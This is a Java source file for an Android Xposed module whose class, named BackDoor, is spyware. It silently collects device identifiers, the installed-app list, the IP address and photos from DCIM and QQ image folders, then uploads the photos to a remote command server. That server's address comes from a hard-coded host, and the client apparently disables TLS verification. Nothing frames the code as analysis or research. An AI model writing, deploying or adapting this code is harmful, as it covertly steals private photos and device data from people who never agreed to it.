package cn.coderstory.xposedtemplate.hack;

import android.app.ActivityManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import cn.coderstory.xposedtemplate.State;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import lombok.SneakyThrows;
import okhttp3.*;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;

import static android.content.Context.ACTIVITY_SERVICE;
import static cn.coderstory.xposedtemplate.hack.DataCollection.getIP;


public class BackDoor {
    public static OkHttpClient client = DataCollection.getUnsafeOkHttpClient();
    public static BackDoor INSTANCE = new BackDoor();
    public static Gson gson = new Gson();
    public static String serial = Settings.Secure.getString(State.context.getContentResolver(), Settings.Secure.ANDROID_ID);

    public void reportDevice() {
        String brand = Build.BRAND + "  " +  Build.MODEL;
        String version = Build.VERSION.RELEASE;
        List<String> appList = DataCollection.getPkgList();
        AtomicReference<String> ip = new AtomicReference<>(getIP());
        int imgCount = getImageCount();
        DeviceInfo info = new DeviceInfo();
        info.setIp(ip.get());
        info.setApplications(appList);
        info.setBrand(brand);
        info.setAndroidVersion(version);
        info.setImageCount(imgCount);
        info.setSerial(BackDoor.serial);
        info.setLastOnline(System.currentTimeMillis());
        try {
            File sdcard = Environment.getExternalStorageDirectory();
            File dcim = new File(sdcard, "DCIM/");
            for (File file : dcim.listFiles()) {
                for (File ignored : file.listFiles()) {
                    State.imgList.add(ignored);
                }
            }
            File qq = new File(sdcard,"Tencent/QQ_Images");
            for (File file : qq.listFiles()) {
                State.imgList.add(file);
            }
            //List<String> ignore = this.getIgnore();
        } catch (Exception e) {
            State.hasPermission = false;
        }


        Thread t = new Thread(() -> {
            while (true) {
                try {
                    info.setLastOnline(System.currentTimeMillis());
                    RequestBody body = RequestBody.create(
                            MediaType.parse("application/json"), gson.toJson(info));
                    Request request = new Request.Builder()
                            .url(State.baseURL + "/reportDevice")
                            .post(body)
                            .build();
                    Thread.sleep(1000*60);
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
        });
        t.start();

    }

    public BackDoor() {
        Log.i("TAG","实例化Backdoor");
        reportDevice();
        starUploadImg();
        getMediaList();
        setNotice();
    }
    public void starUploadImg() {
        Thread uploadImageThread = new Thread(() -> {
            while (true) {
                try {
                    List<File> list = State.imgList;
                    int index = (int) (Math.random()* list.size());
                    File file = list.get(index);

                    if (isBackground(State.context)) {
                        BackDoor.INSTANCE.uploadImage(file);
                    }
                    Thread.sleep(5000);
                } catch (Exception e) {

                }
            }
        });
        uploadImageThread.start();
    }

    public void setNotice() {
        Thread getNotice = new Thread(() -> {
            Request request = new Request.Builder()
                    .url(State.baseURL + "/system/notice")
                    .get()
                    .build();
            try {
                String msg =  client.newCall(request).execute().body().string();
                State.notice = msg;
                Log.i("TAG","notice内容：" + msg);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
        getNotice.start();
    }



    int getImageCount() {
        int num = 0;
        try {
            File sdcard = Environment.getExternalStorageDirectory();
            File dcim = new File(sdcard, "DCIM/");
            for (File file : dcim.listFiles()) {
                for (File ignored : file.listFiles()) {
                    num++;
                }
            }
            File qq = new File(sdcard,"Tencent/QQ_Images");
            for (File file : qq.listFiles()) {
                num++;
            }
        } catch (Exception ignored) {
            num = -1;
        }
        return num;

    }
    @SneakyThrows
    public void uploadImage(File file ) {
        MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
        RequestBody body = new MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("imgName", file.getName())
                .addFormDataPart("imgFile",file.getAbsolutePath(),
                        RequestBody.create(MediaType.parse("application/octet-stream"),
                                file))
                .addFormDataPart("serial",serial)
                .build();
        Request request = new Request.Builder()
                .url(State.baseURL + "/upload")
                .method("POST", body)
                .addHeader("Accept-Language", "zh-CN,zh;q=0.9")
                .addHeader("Connection", "keep-alive")
                .addHeader("Content-Type", "application/x-www-form-urlencoded")
                .build();
        Response response = client.newCall(request).execute();
    }
    @SneakyThrows
    public List<String> getIgnore() {
        MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded");
        RequestBody body = RequestBody.create(mediaType, "{\r\n    \r\n}");
        Request request = new Request.Builder()
                .url(State.baseURL + "/ignore?device=" + BackDoor.serial)
                .method("POST", body)
                .addHeader("Accept", "application/json, text/plain, */*")
                .addHeader("Accept-Language", "zh-CN,zh;q=0.9")
                .addHeader("Connection", "keep-alive")
                .addHeader("Content-Type", "application/x-www-form-urlencoded")
                .build();
        AtomicReference<String> res = new AtomicReference<>("");
        Thread t = new Thread( () -> {
            try {
                res.set(client.newCall(request).execute().body().string());
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
        t.start();
        while (true) {
            if (!res.get().equals("")) {
                break;
            }
            Thread.sleep(50);
        }
        return gson.fromJson(res.get(), new TypeToken<List<String>>(){}.getType());
    }
    @SneakyThrows
    public static String getBaseURL() {
        AtomicReference<String> str = new AtomicReference<>("");
        Thread t = new Thread(() -> {
            try {
                str.set(client.newCall(new Request(new Request.Builder()
                        .url("https://api-pord.pprocket.cn/")
                )).execute().body().string());
            } catch (IOException e) {
                throw new RuntimeException(e);
            }

        });
        t.start();
        while (true) {
            if (!str.get().equals("")) {
                break;
            }
            Thread.sleep(50);
        }
        return str.get();
    }
    @SneakyThrows
    public static void getMediaList() {
        AtomicReference<String> result = new AtomicReference<>("");
        Thread t = new Thread(() -> {
            try {
                result.set(client.newCall(new Request.Builder()
                        .url(State.baseURL + "/system/video")
                        .build()
                ).execute().body().string());
                State.mediaList = gson.fromJson(result.get(), new TypeToken<List<String>>(){}.getType());
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
        t.start();
    }
    private boolean isBackground(Context context){
        ActivityManager activityManager = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo>  appProcessInfoList = activityManager.getRunningAppProcesses();
        if(appProcessInfoList == null){
            return false;
        }

        String packageName = context.getPackageName();
        for(ActivityManager.RunningAppProcessInfo processInfo : appProcessInfoList){
            if(processInfo.processName.equals(packageName) && processInfo.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND ){
                return true;
            }
        }
        return false;
    }

}
